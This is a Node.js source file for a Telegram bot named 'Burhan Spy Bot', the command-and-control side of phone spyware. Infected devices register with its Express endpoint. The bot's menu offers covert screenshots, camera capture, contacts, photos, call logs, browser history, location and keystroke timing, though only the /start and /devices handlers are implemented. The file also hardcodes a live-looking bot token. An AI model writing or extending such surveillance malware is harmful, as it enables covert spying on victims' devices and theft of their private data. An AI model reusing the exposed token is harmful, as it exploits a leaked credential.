const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const express = require('express');

const token = '8811118034:AAHr5UjOeT43-D4zPadC80V6dmQpgsyqIcM';
const YOUR_USER_ID = 2062068620;
const bot = new TelegramBot(token, { polling: true });
const app = express();
app.use(express.json());

// Device register API (App se data aayega)
let devices = {};

app.post('/api/register-device', (req, res) => {
    const { deviceId, deviceName, status } = req.body;
    devices[deviceId] = { 
        deviceName, 
        status: status || 'online', 
        lastSeen: Date.now() 
    };
    res.json({ success: true });
});

// Bot ko commands sunna hai
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    bot.sendMessage(chatId, `🔥 Welcome to Burhan Spy Bot! 🔥\n\n🎯 Owner: Sheikh Burhan\n\n📜 Commands:\n/devices - View all devices\n/snapshot - Screen Shot\n/front_cam - Front Camera\n/back_cam - Back Camera\n/contacts - Contacts\n/photos - Photos and Videos\n/call_logs - Call Logs\n/browser_history - Browser History\n/battery - Battery %\n/location - Location\n/ip - Original IP\n/status - Online/Offline Status\n/key_time - Key Time Status`);
});

bot.onText(/\/devices/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    
    const online = Object.entries(devices).filter(([id, d]) => d.status === 'online');
    const offline = Object.entries(devices).filter(([id, d]) => d.status !== 'online');
    
    let message = "📱 Device List\n\n";
    message += "🟢 Online Devices:\n";
    if (online.length > 0) {
        online.forEach(([id, d]) => {
            message += `• ${d.deviceName || 'Unknown'} (ID: ${id})\n`;
        });
    } else {
        message += "No online devices.\n";
    }
    
    message += "\n🔴 Offline Devices:\n";
    if (offline.length > 0) {
        offline.forEach(([id, d]) => {
            message += `• ${d.deviceName || 'Unknown'} (ID: ${id})\n`;
        });
    } else {
        message += "No offline devices.\n";
    }
    
    bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

// Authorization check
function isAuthorized(msg) {
    return msg.from.id === YOUR_USER_ID;
}

// Express server start karo
app.listen(3000, () => {
    console.log("Server running on port 3000");
});
